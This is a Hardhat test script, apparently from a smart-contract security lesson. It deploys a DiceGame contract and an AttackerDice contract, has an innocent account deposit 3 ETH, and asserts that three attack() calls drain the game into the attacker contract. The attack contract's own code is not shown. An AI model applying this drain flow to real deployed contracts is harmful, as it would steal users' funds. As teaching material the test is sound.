const { expect } = require("chai");
const { BigNumber } = require("ethers");
const { parseEther } = require("ethers/lib/utils");
const { ethers } = require("hardhat");

describe("Attack", function () {
  it("Should empty the balance of the good contract", async function () {
    // Deploy the good contract
    const diceGameFactory = await ethers.getContractFactory("DiceGame");
    const diceGame = await diceGameFactory.deploy();
    await diceGame.deployed();

    //Deploy the bad contract
    const attackerFactory = await ethers.getContractFactory("AttackerDice");
    const attacker = await attackerFactory.deploy(diceGame.address);
    await attacker.deployed();

    // Get two addresses, treat one as innocent user and one as attacker
    const [attackerAddress, innocentAddress] = await ethers.getSigners();
    console.log(innocentAddress.address);
    console.log(attackerAddress.address);
    // Innocent User deposits 3 ETH into savingsBank
    let tx = await diceGame.connect(innocentAddress).addBalance({
      value: parseEther("3"),
    });
    await tx.wait();

    // Check that at this point the savingsBank's balance is 3 ETH
    let balanceETH = await ethers.provider.getBalance(diceGame.address);
    expect(balanceETH).to.equal(parseEther("3"));

    // Attacker calls the `attack` function on attacker

    tx = await attacker.connect(attackerAddress).attack();
    await tx.wait();
    balanceETH = await ethers.provider.getBalance(diceGame.address);
    expect(balanceETH).to.equal(parseEther("2"));

    tx = await attacker.connect(attackerAddress).attack();
    await tx.wait();
    balanceETH = await ethers.provider.getBalance(diceGame.address);
    expect(balanceETH).to.equal(parseEther("1"));

    tx = await attacker.connect(attackerAddress).attack();
    await tx.wait();
    balanceETH = await ethers.provider.getBalance(diceGame.address);
    expect(balanceETH).to.equal(parseEther("0"));

    balanceETH = await ethers.provider.getBalance(attacker.address);
    expect(balanceETH).to.equal(parseEther("3"));
  });
});
